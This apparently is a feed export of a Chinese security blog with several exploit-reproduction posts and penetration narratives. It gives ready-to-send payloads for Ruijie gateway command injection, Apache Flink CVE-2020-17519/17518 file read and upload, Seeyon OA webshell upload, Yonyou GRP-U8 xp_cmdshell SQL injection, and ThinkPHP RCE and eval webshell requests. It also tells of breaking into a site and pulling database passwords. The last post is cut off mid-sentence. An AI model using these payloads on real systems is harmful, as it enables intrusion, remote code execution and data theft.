      <url>2021/02/03/%E9%94%90%E6%8D%B7%E7%BD%91%E5%85%B3RCE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自己搭建好测试环境"><a href="#自己搭建好测试环境" class="headerlink" title="自己搭建好测试环境"></a>自己搭建好测试环境</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612322111995.webp" alt="image"></p><h3 id="漏洞文件"><a href="#漏洞文件" class="headerlink" title="漏洞文件"></a>漏洞文件</h3><h3 id="guest-auth-guestIsUp-php"><a href="#guest-auth-guestIsUp-php" class="headerlink" title="/guest_auth/guestIsUp.php"></a>/guest_auth/guestIsUp.php</h3><pre><code>&lt;?php    //查询用户是否上线了    $userip = @$_POST[&#39;ip&#39;];    $usermac = @$_POST[&#39;mac&#39;];    if (!$userip || !$usermac) &#123;        exit;    &#125;    /* 判断该用户是否已经放行 */    $cmd = &#39;/sbin/app_auth_hook.elf -f &#39; . $userip;    $res = exec($cmd, $out, $status);    /* 如果已经上线成功 */    if (strstr($out[0], &quot;status:1&quot;)) &#123;        echo &#39;true&#39;;    &#125;?&gt;</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="列出poc"><a href="#列出poc" class="headerlink" title="列出poc"></a>列出poc</h3><pre><code>POST http://127.0.0.1:9000/guest_auth/guestIsUp.php HTTP/1.1Host: 127.0.0.1:9000User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: LOCAL_LANG_COOKIE=zh; UI_LOCAL_COOKIE=zh; sysmode=sys-mode%20gatewayDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 45ip=127.0.0.1|echo 1231231 &gt;111.txt &amp;mac=00-00</code></pre><h3 id="发送poc"><a href="#发送poc" class="headerlink" title="发送poc"></a>发送poc</h3><p>  <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612322342932.webp" alt="image"></p><h3 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h3><p>  <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612322433963.webp" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> rce </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Flink CVE-2020-17519  CVE-2020-17518</title>
      <link href="2021/02/03/Apache-Flink-8/"/>
      <url>2021/02/03/Apache-Flink-8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h2><h4 id="搭建好测试环境进入flink"><a href="#搭建好测试环境进入flink" class="headerlink" title="搭建好测试环境进入flink"></a>搭建好测试环境进入flink</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612318501808.webp" alt="image"></p><h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><pre><code>    https://xx.xx.xx.xx/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612318543434.webp" alt="image"></p><h2 id="CVE-2020-17518"><a href="#CVE-2020-17518" class="headerlink" title="CVE-2020-17518"></a>CVE-2020-17518</h2><h4 id="直接复用poc"><a href="#直接复用poc" class="headerlink" title="直接复用poc"></a>直接复用poc</h4><pre><code>POST /jars/upload HTTP/1.1Host: xx.xx.xx.xxAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: multipart/form-data; boundary=--------721072898Content-Length: 151----------721072898Content-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;../../../../../../../../tmp/test.txt&quot;testtest----------721072898--</code></pre><p>   <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612319702839.webp" alt="image"></p><h4 id="测试是否上传成功"><a href="#测试是否上传成功" class="headerlink" title="测试是否上传成功"></a>测试是否上传成功</h4><p>  <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612319749301.webp" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> CVE-2020-17519 </tag>
            
            <tag> CVE-2020-17518 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>致远ajax.do 任意文件上传</title>
      <link href="2021/01/08/%E8%87%B4%E8%BF%9Cajax-do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>2021/01/08/%E8%87%B4%E8%BF%9Cajax-do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="漏洞影响范围："><a href="#漏洞影响范围：" class="headerlink" title="漏洞影响范围："></a>漏洞影响范围：</h2><pre><code>致远OA V8.0致远OA V7.1、V7.1SP1致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3致远OA V6.0、V6.1SP1、V6.1SP2致远OA V5.x致远OA G6</code></pre><h2 id="自己搭建好测试环境"><a href="#自己搭建好测试环境" class="headerlink" title="自己搭建好测试环境"></a>自己搭建好测试环境</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1.webp" alt="image"></p><h2 id="复测过程"><a href="#复测过程" class="headerlink" title="复测过程"></a>复测过程</h2><h4 id="验证是否存在漏洞漏洞文件"><a href="#验证是否存在漏洞漏洞文件" class="headerlink" title="验证是否存在漏洞漏洞文件"></a>验证是否存在漏洞漏洞文件</h4><pre><code>http://192.168.1.18:8080/seeyon/autoinstall.do/..;/ajax.do</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1614307043(1).webp" alt="image"></p><h5 id="出现-“出现异常：java-lang-NullPointerException-null-”-则存在漏洞组件可能存在漏洞！"><a href="#出现-“出现异常：java-lang-NullPointerException-null-”-则存在漏洞组件可能存在漏洞！" class="headerlink" title="出现 “出现异常：java.lang.NullPointerException:null ” 则存在漏洞组件可能存在漏洞！"></a>出现 “出现异常：java.lang.NullPointerException:null ” 则存在漏洞组件可能存在漏洞！</h5><h4 id="使用poc进行漏洞利用"><a href="#使用poc进行漏洞利用" class="headerlink" title="使用poc进行漏洞利用"></a>使用poc进行漏洞利用</h4><pre><code>[&#123;&#39;formulaType&#39;: 1, &#39;formulaName&#39;: &#39;test&#39;, &#39;formulaExpression&#39;: &#39;String path = &quot;../webapps/seeyon/&quot;;        java.io.PrintWriter printWriter2 = new java.io.PrintWriter(path+&quot;文件名.txt&quot;);        String shell = &quot;需要上传的内容base64编码放入此处&quot;;        sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();        String decodeString = new String(decoder.decodeBuffer(shell),&quot;UTF-8&quot;);        printWriter2.println(decodeString);        printWriter2.close();&#125;;test();def static xxx()&#123;&#39;&#125;, &#39;&#39;, &#123;&#125;, &#39;true&#39;]</code></pre><h4 id="修改好上述poc-内容后进行gzip加密后再进行url编码即可得到漏洞利用数据"><a href="#修改好上述poc-内容后进行gzip加密后再进行url编码即可得到漏洞利用数据" class="headerlink" title="修改好上述poc 内容后进行gzip加密后再进行url编码即可得到漏洞利用数据"></a>修改好上述poc 内容后进行gzip加密后再进行url编码即可得到漏洞利用数据</h4><h3 id="加密与利用过程"><a href="#加密与利用过程" class="headerlink" title="加密与利用过程"></a>加密与利用过程</h3><h6 id="将需要上传的内容进行base64编码"><a href="#将需要上传的内容进行base64编码" class="headerlink" title="将需要上传的内容进行base64编码"></a>将需要上传的内容进行base64编码</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/23234234.webp" alt="image"></p><h6 id="替换poc内String-shell内容-修改上传文件名"><a href="#替换poc内String-shell内容-修改上传文件名" class="headerlink" title="替换poc内String shell内容 修改上传文件名"></a>替换poc内String shell内容 修改上传文件名</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84poc.webp" alt="image"></p><h6 id="进行gzip与url编码"><a href="#进行gzip与url编码" class="headerlink" title="进行gzip与url编码"></a>进行gzip与url编码</h6><pre><code>在线加密工具https://ailiqun.xyz/%E5%9C%A8%E7%BA%BF%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B.webp" alt="image"></p><h6 id="最终得到利用数据包为"><a href="#最终得到利用数据包为" class="headerlink" title="最终得到利用数据包为"></a>最终得到利用数据包为</h6><pre><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1Host: 127.0.0.1Connection: closeCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9loginPageURL=; login_locale=zh_CN;Content-Type: application/x-www-form-urlencodedmanagerMethod=validate&amp;arguments=进行gzip与url编码后的poc内容</code></pre><h6 id="使用burp发送数据包进行漏洞利用"><a href="#使用burp发送数据包进行漏洞利用" class="headerlink" title="使用burp发送数据包进行漏洞利用"></a>使用burp发送数据包进行漏洞利用</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F.webp" alt="image"></p><h6 id="利用成功"><a href="#利用成功" class="headerlink" title="利用成功"></a>利用成功</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E9%AA%8C%E8%AF%81.webp" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 致远OA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密杂项</title>
      <link href="2020/11/02/%E6%9D%82%E9%A1%B9/"/>
      <url>2020/11/02/%E6%9D%82%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抽根利群冷静下再想想！" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="61f7b2801a77afa596575a45036e929c2db8a0059dd7e5b6ae23fa26fbf16568"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂不公开                                                                                                                                                                                   .</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 记录 </tag>
            
            <tag> 密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用友GRP-U8 SQL注入复现 外加发一个通用注入点</title>
      <link href="2020/10/30/%E7%94%A8%E5%8F%8BGRP-U8/"/>
      <url>2020/10/30/%E7%94%A8%E5%8F%8BGRP-U8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="影响范围-用友GRP-U8系统"><a href="#影响范围-用友GRP-U8系统" class="headerlink" title="影响范围  (用友GRP-U8系统)"></a>影响范围  (用友GRP-U8系统)</h3><h2 id="1-复现网上的poc"><a href="#1-复现网上的poc" class="headerlink" title="1.  复现网上的poc"></a>1.  复现网上的poc</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1604023148741.webp" alt="image"></p><p>大神们已经爆出了利用方式</p><pre><code>POST /ProxyContent-Type: application/x-www-form-urlencodedcVer=9.8.0&amp;dp=&lt;?xml version=&quot;1.0&quot; encoding=&quot;GB2312&quot;?&gt;&lt;R9PACKET version=&quot;1&quot;&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format=&quot;text&quot;&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format=&quot;text&quot;&gt;exec xp_cmdshell &#39;ipconfig&#39;&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt;</code></pre><h3 id="直接复用poc即可"><a href="#直接复用poc即可" class="headerlink" title="直接复用poc即可"></a>直接复用poc即可</h3><p> <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1604023462049.webp" alt="image"></p><h2 id="2-外带发一个通用利用点"><a href="#2-外带发一个通用利用点" class="headerlink" title="2.  外带发一个通用利用点"></a>2.  外带发一个通用利用点</h2><pre><code>POCPOST /U8SMSProxy?class=XXNote&amp;id=qryyfs HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=FD111DFB1059473AF214DB0E529918E5DNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 78begindate=2020-09-27&amp;enddate=2020-10-27&amp;search=</code></pre><h3 id="sqlmap无脑梭哈就行"><a href="#sqlmap无脑梭哈就行" class="headerlink" title="sqlmap无脑梭哈就行"></a>sqlmap无脑梭哈就行</h3><p> <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1604024847782.webp" alt="image"></p><h3 id="最近HVV好累"><a href="#最近HVV好累" class="headerlink" title="最近HVV好累"></a>最近HVV好累</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1604025039517.webp" alt="image"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 用友GRP-U8 </tag>
            
            <tag> sql </tag>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次非法站渗透任务</title>
      <link href="2020/10/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%9E%E6%B3%95%E7%AB%99%E6%B8%97%E9%80%8F/"/>
      <url>2020/10/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%9E%E6%B3%95%E7%AB%99%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="接到一个目标域名访问查看"><a href="#接到一个目标域名访问查看" class="headerlink" title="接到一个目标域名访问查看"></a>接到一个目标域名访问查看</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602911708106.webp" alt="image"></p><h4 id="简单扫描了下子域名-发现一个-user-xxx-com-的用户登录的子域名网站"><a href="#简单扫描了下子域名-发现一个-user-xxx-com-的用户登录的子域名网站" class="headerlink" title="简单扫描了下子域名 发现一个 user.xxx.com 的用户登录的子域名网站"></a>简单扫描了下子域名 发现一个 user.xxx.com 的用户登录的子域名网站</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602911942339.webp" alt="image"></p><h5 id="进行常规测试未发现突破口-注册账户进入后发现也只是个普通的用户后台功能很少测试依然无太大发现-其余几个子域名未发现功能页面"><a href="#进行常规测试未发现突破口-注册账户进入后发现也只是个普通的用户后台功能很少测试依然无太大发现-其余几个子域名未发现功能页面" class="headerlink" title="进行常规测试未发现突破口 注册账户进入后发现也只是个普通的用户后台功能很少测试依然无太大发现 其余几个子域名未发现功能页面"></a>进行常规测试未发现突破口 注册账户进入后发现也只是个普通的用户后台功能很少测试依然无太大发现 其余几个子域名未发现功能页面</h5><h4 id="掏出大字典对子域名进行爆破-以扩大渗透面"><a href="#掏出大字典对子域名进行爆破-以扩大渗透面" class="headerlink" title="掏出大字典对子域名进行爆破 以扩大渗透面"></a>掏出大字典对子域名进行爆破 以扩大渗透面</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602912552198.webp" alt="image"></p><h5 id="对这些扫描出来的子域名进行测试出现了惊喜"><a href="#对这些扫描出来的子域名进行测试出现了惊喜" class="headerlink" title="对这些扫描出来的子域名进行测试出现了惊喜"></a>对这些扫描出来的子域名进行测试出现了惊喜</h5><h5 id="在其中一个子域名的真实ip下发现一个端口搭建了网站进行查看"><a href="#在其中一个子域名的真实ip下发现一个端口搭建了网站进行查看" class="headerlink" title="在其中一个子域名的真实ip下发现一个端口搭建了网站进行查看"></a>在其中一个子域名的真实ip下发现一个端口搭建了网站进行查看</h5><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602912758957.webp" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602912961625.webp" alt="image"></p><h1 id="wow-十年磨一剑"><a href="#wow-十年磨一剑" class="headerlink" title="wow 十年磨一剑 "></a>wow 十年磨一剑 <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602912886345.webp" alt="image"></h1><h4 id="直接掏出-exp-怼"><a href="#直接掏出-exp-怼" class="headerlink" title="直接掏出 exp 怼"></a>直接掏出 exp 怼</h4><pre><code>https://xx.xx.xx.xx/?s=index/indexposts=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter写shellPOSTs=file_put_contents(&#39;Liqun.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert有captcha路由时https://xx.xx.xx.xx/?s=captcha/calcPOST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h4 id="然而怼了个寂寞"><a href="#然而怼了个寂寞" class="headerlink" title="然而怼了个寂寞"></a>然而怼了个寂寞</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602913159979.webp" alt="image"></p><p>// 调用函数或者方法过滤</p><h4 id="很显然敏感函数或方法肯定都残废了"><a href="#很显然敏感函数或方法肯定都残废了" class="headerlink" title="很显然敏感函数或方法肯定都残废了"></a>很显然敏感函数或方法肯定都残废了</h4><h3 id="遇事不要慌-换个方法-操作下-可以直接利用Session-包含-getshell"><a href="#遇事不要慌-换个方法-操作下-可以直接利用Session-包含-getshell" class="headerlink" title="遇事不要慌 换个方法 操作下 可以直接利用Session 包含 getshell"></a>遇事不要慌 换个方法 操作下 可以直接利用Session 包含 getshell</h3><pre><code>PocPOST http://xx.xx.xx.xx/?s=captch HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: PHPSESSID=LIqunDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 105_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php eval($_POST[&#39;Liqun&#39;])?&gt;&amp;server[]=1</code></pre><h4 id="使用poc-发送数据包"><a href="#使用poc-发送数据包" class="headerlink" title="使用poc 发送数据包"></a>使用poc 发送数据包</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602913609708.webp" alt="image"></p><h4 id="然后直接使用蚁剑进行-包含连接就行"><a href="#然后直接使用蚁剑进行-包含连接就行" class="headerlink" title="然后直接使用蚁剑进行 包含连接就行"></a>然后直接使用蚁剑进行 包含连接就行</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602913672441.webp" alt="image"></p><h4 id="就那么开开心心的顺利getshell了"><a href="#就那么开开心心的顺利getshell了" class="headerlink" title="就那么开开心心的顺利getshell了"></a>就那么开开心心的顺利getshell了</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602913749047.webp" alt="image"></p><h4 id="连接后-自行新建-或上传一个马儿-Session-有时效性会失效"><a href="#连接后-自行新建-或上传一个马儿-Session-有时效性会失效" class="headerlink" title="连接后 自行新建 或上传一个马儿   Session 有时效性会失效"></a>连接后 自行新建 或上传一个马儿   Session 有时效性会失效</h4><h4 id="翻出数据库密码-连接内网数据库"><a href="#翻出数据库密码-连接内网数据库" class="headerlink" title="翻出数据库密码 连接内网数据库"></a>翻出数据库密码 连接内网数据库</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602913979767.webp" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602914098687.webp" alt="image"></p><h4 id="目的达到"><a href="#目的达到" class="headerlink" title="目的达到"></a>目的达到</h4>]]></content>
      
      
      <categories>
          
          <category> 渗透记录 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkPHP </tag>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次对某企业的授权渗透测试</title>
      <link href="2020/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>2020/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h1><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596981232488.webp" alt="image"></p><h3 id="到其官网门户查看了一圈-未发现系统链接-ip为阿里云"><a href="#到其官网门户查看了一圈-未发现系统链接-ip为阿里云" class="headerlink" title="到其官网门户查看了一圈 未发现系统链接 ip为阿里云"></a>到其官网门户查看了一圈 未发现系统链接 ip为阿里云</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977082693.webp" alt="image"></p><h3 id="通过谷歌语法查询其公司系统资产发现一套gprs系统"><a href="#通过谷歌语法查询其公司系统资产发现一套gprs系统" class="headerlink" title="通过谷歌语法查询其公司系统资产发现一套gprs系统"></a>通过谷歌语法查询其公司系统资产发现一套gprs系统</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977157553.webp" alt="image"></p><h3 id="访问发现其ip-为真实ip-而且开放了大量端口"><a href="#访问发现其ip-为真实ip-而且开放了大量端口" class="headerlink" title="访问发现其ip 为真实ip 而且开放了大量端口"></a>访问发现其ip 为真实ip 而且开放了大量端口</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977229919.webp" alt="image"></p><h3 id="对gprs系统真实ip进行全端口扫描继续收集信息-很幸运发现大量其公司资产"><a href="#对gprs系统真实ip进行全端口扫描继续收集信息-很幸运发现大量其公司资产" class="headerlink" title="对gprs系统真实ip进行全端口扫描继续收集信息 很幸运发现大量其公司资产"></a>对gprs系统真实ip进行全端口扫描继续收集信息 很幸运发现大量其公司资产</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977284921.webp" alt="image"></p><h3 id="对收集的资产进行初步分析与查看发现一个-web-server服务包含大量查询接口"><a href="#对收集的资产进行初步分析与查看发现一个-web-server服务包含大量查询接口" class="headerlink" title="对收集的资产进行初步分析与查看发现一个 web server服务包含大量查询接口"></a>对收集的资产进行初步分析与查看发现一个 web server服务包含大量查询接口</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977379981.webp" alt="image"></p><h3 id="初步判断这些接口大概率存在sql注入"><a href="#初步判断这些接口大概率存在sql注入" class="headerlink" title="初步判断这些接口大概率存在sql注入"></a>初步判断这些接口大概率存在sql注入</h3><h1 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h1><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980796489.webp" alt="image"></p><h3 id="使用Netsparker-对其http-xx-xx-xx-xx-service1-asmx-WSDL-文件进行针对sqlserver-数据库的扫描"><a href="#使用Netsparker-对其http-xx-xx-xx-xx-service1-asmx-WSDL-文件进行针对sqlserver-数据库的扫描" class="headerlink" title="使用Netsparker 对其http://xx.xx.xx.xx/service1.asmx?WSDL 文件进行针对sqlserver 数据库的扫描"></a>使用Netsparker 对其<a href="http://xx.xx.xx.xx/service1.asmx?WSDL">http://xx.xx.xx.xx/service1.asmx?WSDL</a> 文件进行针对sqlserver 数据库的扫描</h3><h3 id="果不其然大量接口存在-sql注入"><a href="#果不其然大量接口存在-sql注入" class="headerlink" title="果不其然大量接口存在 sql注入"></a>果不其然大量接口存在 sql注入</h3><p> <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977828848.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977916661.webp" alt="image"></p><h3 id="手动测试用户为sa后-拉出神器sqlmap-直接-–os-shell一把梭"><a href="#手动测试用户为sa后-拉出神器sqlmap-直接-–os-shell一把梭" class="headerlink" title="手动测试用户为sa后 拉出神器sqlmap 直接 –os-shell一把梭"></a>手动测试用户为sa后 拉出神器sqlmap 直接 –os-shell一把梭</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978135522.webp" alt="image"></p><h3 id="直接查找网站路径准备写入一句话木马拿shell"><a href="#直接查找网站路径准备写入一句话木马拿shell" class="headerlink" title="直接查找网站路径准备写入一句话木马拿shell"></a>直接查找网站路径准备写入一句话木马拿shell</h3><h4 id="途中出了一点意外-都是由于太菜在找网站绝对路径上整了-半个多小时"><a href="#途中出了一点意外-都是由于太菜在找网站绝对路径上整了-半个多小时" class="headerlink" title="途中出了一点意外 都是由于太菜在找网站绝对路径上整了 半个多小时- -"></a>途中出了一点意外 都是由于太菜在找网站绝对路径上整了 